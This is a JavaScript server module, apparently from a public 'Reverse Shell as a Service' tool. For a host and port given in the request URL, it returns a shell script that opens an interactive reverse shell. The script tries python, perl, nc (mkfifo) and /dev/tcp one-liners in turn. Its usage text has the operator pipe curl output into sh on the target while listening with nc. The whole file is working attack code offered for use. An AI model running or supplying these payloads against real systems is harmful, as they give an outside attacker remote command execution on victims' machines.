'use strict';

const usage = `# Reverse Shell as a Service
# https://github.com/lukechilds/reverse-shell
#
# 1. On your machine:
#      nc -l 1337
#
# 2. On the target machine:
#      curl https://shell.now.sh/yourip:1337 | sh
#
# 3. Don't be a dick`;

const generatePayloads = (host, port) => ({
	python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("${host}",${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'`,
	perl: `perl -e 'use Socket;$i="${host}";$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
	nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${host} ${port} >/tmp/f`,
	sh: `/bin/sh -i >& /dev/tcp/${host}/${port} 0>&1`
});

const generateScript = (host, port) => {
	const payloads = generatePayloads(host, port);

	return Object.keys(payloads).reduce((acc, cmd) => {
		acc += `if command -v ${cmd} > /dev/null 2>&1; then\n` +
			` ${payloads[cmd]}\n` +
			' exit; \n' +
			'fi \n';
		return acc;
	}, '');
};

const reverseShell = req => {
	const [host, port] = req.url.substr(1).split(':');
	return (host && port) ? generateScript(host, port) : usage;
};

module.exports = reverseShell;
